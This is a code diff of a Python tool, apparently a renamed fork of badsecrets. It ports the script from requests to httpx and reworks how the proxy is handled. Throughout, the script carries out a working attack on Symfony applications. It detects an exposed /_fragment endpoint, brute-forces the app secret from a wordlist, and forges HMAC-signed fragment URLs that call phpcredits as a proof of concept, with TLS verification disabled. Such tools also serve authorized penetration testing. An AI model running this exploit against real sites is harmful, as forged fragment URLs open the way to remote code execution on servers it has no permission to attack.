@@ -8,16 +8,13 @@ import os
 import sys
 import hashlib
 import argparse
-import requests
+import httpx
 from contextlib import suppress
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 
 SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 sys.path.append(os.path.dirname(SCRIPT_DIR))
 
-from badsecrets import modules_loaded
+from crapsecrets import modules_loaded
 
 Symfony_SignedURL = modules_loaded["symfony_signedurl"]
 
@@ -61,49 +58,61 @@ def main():
     if not args.url:
         return
 
-    proxies = None
+    proxy = None
     if args.proxy:
-        proxies = {"http": args.proxy, "https": args.proxy}
+        if not args.proxy.startswith("http://") and not args.proxy.startswith("https://"):
+            proxy = "http://" + args.proxy
+        elif args.proxy.startswith("http:") and not args.proxy.startswith("http://"):
+            proxy = "http://" + args.proxy[5:]
+        elif args.proxy.startswith("https:") and not args.proxy.startswith("https://"):
+            proxy = "https://" + args.proxy[6:]
+        else:
+            proxy = args.proxy
 
     headers = {}
     if args.user_agent:
         headers["User-agent"] = args.user_agent
 
-    fragment_test_url = f"{args.url.rstrip('/')}/_fragment"
-    try:
-        res_fragment = requests.get(f"{fragment_test_url}", proxies=proxies, headers=headers, verify=False)
-    except (requests.exceptions.ConnectionError, requests.exceptions.ConnectTimeout):
-        print(f"Error connecting to URL: [{args.url}]")
-        return
+    # Remove trailing slash and build URLs
+    base_url = args.url.rstrip('/')
+    fragment_test_url = f"{base_url}/_fragment"
+    negative_test_url = f"{base_url}/AAAAAAAA"
 
-    negative_test_url = f"{args.url.rstrip('/')}/AAAAAAAA"
-    res_random = requests.get(f"{negative_test_url}", proxies=proxies, headers=headers, verify=False)
+    # Create a single client configured with proxies, headers, and verify set to False.
+    with httpx.Client(proxy=proxy, headers=headers, verify=False) as client:
+        try:
+            res_fragment = client.get(fragment_test_url)
+        except (httpx.ConnectError, httpx.ConnectTimeout):
+            print(f"Error connecting to URL: [{fragment_test_url}]")
+            return
 
-    if (res_fragment.status_code != 403) or not (res_random.status_code != res_fragment.status_code):
-        print(f"Not a Symfony app, or _fragment functionality not enabled...")
-        return
+        res_random = client.get(negative_test_url)
 
-    print("Target appears to by a Symfony app with _fragment enabled. Brute forcing Symfony secret...")
+        # Check that _fragment returns 403 and differs from the negative URL's status
+        if (res_fragment.status_code != 403) or (res_random.status_code == res_fragment.status_code):
+            print("Not a Symfony app, or _fragment functionality not enabled...")
+            return
 
-    x = Symfony_SignedURL()
+        print("Target appears to be a Symfony app with _fragment enabled. Brute forcing Symfony secret...")
 
-    phpinfo_test_url = f"{args.url.rstrip('/')}/_fragment?_path=_controller%3Dphpcredits"
+        x = Symfony_SignedURL()
+        phpinfo_test_url = f"{base_url}/_fragment?_path=_controller%3Dphpcredits"
 
-    for l in x.load_resources(["symfony_appsecret.txt"]):
-        with suppress(ValueError):
-            secret = l.rstrip()
-            for hash_algorithm in [hashlib.sha256, hashlib.sha1]:
-                hash_value = x.symfonyHMAC(phpinfo_test_url, secret, hash_algorithm)
-                test_url = f"{phpinfo_test_url}&_hash={hash_value.decode()}"
-                test_res = requests.get(f"{test_url}", proxies=proxies, headers=headers, verify=False)
-                if "PHP Authors" in test_res.text:
-                    print(test_url)
-                    print(f"Found Symfony Secret! [{secret}]")
-                    print(f"PoC URL: {test_url}")
-                    print(f"Hash Algorithm: {hash_algorithm.__name__.split('_')[1]}")
-                    return
-
+        # Iterate over potential secrets and try both SHA256 and SHA1
+        for l in x.load_resources(["symfony_appsecret.txt"]):
+            with suppress(ValueError):
+                secret = l.rstrip()
+                for hash_algorithm in [hashlib.sha256, hashlib.sha1]:
+                    hash_value = x.symfonyHMAC(phpinfo_test_url, secret, hash_algorithm)
+                    test_url = f"{phpinfo_test_url}&_hash={hash_value.decode()}"
+                    test_res = client.get(test_url)
+                    if "PHP Authors" in test_res.text:
+                        print(test_url)
+                        print(f"Found Symfony Secret! [{secret}]")
+                        print(f"PoC URL: {test_url}")
+                        print(f"Hash Algorithm: {hash_algorithm.__name__.split('_')[1]}")
+                        return
 
 if __name__ == "__main__":
-    print("badsecrets - Symfony _fragment known secret key brute-force tool\n")
+    print("crapsecrets - Symfony _fragment known secret key brute-force tool\n")
     main()
